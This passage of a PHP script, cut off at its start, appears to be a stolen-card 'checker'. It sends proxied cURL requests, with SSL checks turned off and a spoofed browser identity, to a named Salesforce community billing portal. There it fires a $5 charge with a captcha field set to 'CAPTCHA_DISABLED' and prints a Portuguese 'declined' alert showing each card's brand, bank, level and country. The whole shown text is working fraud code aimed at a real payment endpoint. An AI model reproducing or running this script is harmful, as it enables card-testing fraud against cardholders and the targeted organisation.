  curl_setopt($ch, CURLOPT_POSTFIELDS, 'message=%7B%22actions%22%3A%5B%7B%22id%22%3A%22424%3Ba%22%2C%22descriptor%22%3A%22serviceComponent%3A%2F%2Fui.identity.components.sessiontimeoutwarn.SessionTimeoutWarnController%2FACTION%24getSessionTimeoutConfig%22%2C%22callingDescriptor%22%3A%22UNKNOWN%22%2C%22params%22%3A%7B%7D%7D%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22D7zdsGvlxZfFP0e3F1H_2A%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%22OI3ud8cfCp4Syik0STitsg%22%2C%22COMPONENT%40markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader%22%3A%22NAR59T88qTprOlgZG3yLoQ%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2Fportal%2Fs%2Fbilling&aura.token='.trim(urlencode($token)).'');
  $d5 = curl_exec($ch);
  
  
  
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://bgctopekamch.my.site.com/portal/s/sfsites/aura?r=16&other.recpay_PaymentBase.chargeTransaction=1');
  curl_setopt($ch, CURLOPT_PROXY, $proxy); 
  curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies/cookie'.$random.'.txt');
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies/cookie'.$random.'.txt');
  curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
  'Host: bgctopekamch.my.site.com',
  'Connection: keep-alive',
  'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
  'X-SFDC-Page-Scope-Id: ec870184-f3df-49ad-a761-88c26d42dc31',
  'X-SFDC-Request-Id: 41311500000a877ebe',
  'User-Agent: '.$userAgent.'',
  'Accept: */*',
  'Origin: https://bgctopekamch.my.site.com',
  'Referer: https://bgctopekamch.my.site.com/portal/s/billing',
  'Accept-Language: pt-BR,pt;q=0.9',
    ));
  curl_setopt($ch, CURLOPT_USERAGENT, $userAgent); 
  curl_setopt($ch, CURLOPT_HEADER, 1);
  curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'message=%7B%22actions%22%3A%5B%7B%22id%22%3A%22577%3Ba%22%2C%22descriptor%22%3A%22apex%3A%2F%2Frecpay_PaymentBaseController%2FACTION%24chargeTransaction%22%2C%22callingDescriptor%22%3A%22markup%3A%2F%2Fc%3Arecpay_PaymentFormCredit%22%2C%22params%22%3A%7B%22chargeParams%22%3A%22%7B%5C%22tpayParams%5C%22%3A%7B%5C%22TransactionAmount%5C%22%3A5%2C%5C%22SourceID%5C%22%3A%5C%220014x00001qnWEcAAM%5C%22%2C%5C%22TicketID%5C%22%3A%5C%22a3F4x000000EezSEAS%5C%22%2C%5C%22TenderTypeID%5C%22%3A%5C%22a3E4x000000tvJUEAY%5C%22%7D%2C%5C%22paymentLinkingMap%5C%22%3A%7B%7D%2C%5C%22locationId%5C%22%3A%5C%22%5C%22%7D%22%2C%22captchaToken%22%3A%22CAPTCHA_DISABLED%22%7D%7D%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22D7zdsGvlxZfFP0e3F1H_2A%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%22OI3ud8cfCp4Syik0STitsg%22%2C%22COMPONENT%40markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader%22%3A%22NAR59T88qTprOlgZG3yLoQ%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2Fportal%2Fs%2Fbilling&aura.token='.trim(urlencode($token)).'');
  $d6 = curl_exec($ch);
  $TransactionSetupID = getStr($d6, '"paymentPageURL\":\"https://transaction.hostedpayments.com/?TransactionSetupID=', '\"');
  

  $fp = fopen('session_id.txt', 'w');
  fwrite($fp, $TransactionSetupID);
  fclose($fp);



  echo '       
<div class="alert alert-fixed alert-danger alert-dismissible" role="alert">
                                  <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only"></span></button>
                                  <div class="alert__icon pull-left" >
                                    <i class="pe-7s-close-circle"></i>
                                  </div>
                                  <div class="text-center">
                                  <p class="alert__text"><strong>#Reprovada </strong> '.$lista.' -> Informações: '.$bandeira.' | '.$banco.' | '.$tipo.' '.$level.'('.$pais.') <strong>  -   Response: '.$msg.'|'.$TransactionSetupID.'</strong></p>
                                  </div>
 
                         
  </div>
                                </div>
';



}


        
 curl_close($ch);
 ob_flush();        
                    
             
?>
